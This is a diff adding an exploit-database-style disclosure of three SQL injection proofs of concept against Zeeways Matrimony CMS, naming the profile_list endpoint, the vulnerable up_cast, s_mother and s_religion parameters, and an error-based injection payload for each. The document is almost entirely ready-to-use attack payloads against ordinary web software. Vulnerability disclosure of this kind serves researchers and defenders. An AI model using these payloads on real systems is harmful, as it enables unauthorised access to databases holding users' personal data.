@@ -1,0 +1,33 @@
+# Exploit Title: Zeeways Matrimony CMS - SQL Injection
+# Date: 25.03.2019
+# Exploit Author: Ahmet Ümit BAYRAM
+# Vendor Homepage: http://www.zeeways.com/matrimony-cms/4/productdetail
+# Demo Site: http://www.zeewayscms.com/matrimony/
+# Version: Lastest
+# Tested on: Kali Linux
+# CVE: N/A
+
+----- PoC 1: SQLi -----
+
+Request: http://localhost/[PATH]/profile_list
+Vulnerable Parameter: up_cast (POST)
+Payload:  (select 1 and row(1,1)>(select
+count(*),concat(concat(CHAR(52),CHAR(67),CHAR(117),CHAR(117),CHAR(82),CHAR(120),CHAR(106),CHAR(69),CHAR(48),CHAR(117),CHAR(107)),floor(rand()*2))x
+from (select 1 union select 2)a group by x limit 1))
+
+----- PoC 2: SQLi -----
+
+Request: http://localhost/[PATH]/profile_list
+Vulnerable Parameter: s_mother (GET)
+Payload: (select 1 and row(1%2C1)>(select
+count(*)%2Cconcat(concat(CHAR(52)%2CCHAR(67)%2CCHAR(117)%2CCHAR(113)%2CCHAR(82)%2CCHAR(106)%2CCHAR(97)%2CCHAR(51)%2CCHAR(113)%2CCHAR(122)%2CCHAR(116))%2Cfloor(rand()*2))x
+from (select 1 union select 2)a group by x limit 1))
+
+
+----- PoC 3: SQLi -----
+
+Request: http://localhost/[PATH]/profile_list?s_mother=1
+Vulnerable Parameter: s_religion (POST)
+Payload: (select 1 and row(1,1)>(select
+count(*),concat(concat(CHAR(52),CHAR(67),CHAR(117),CHAR(50),CHAR(86),CHAR(74),CHAR(77),CHAR(54),CHAR(109),CHAR(84),CHAR(73)),floor(rand()*2))x
+from (select 1 union select 2)a group by x limit 1))
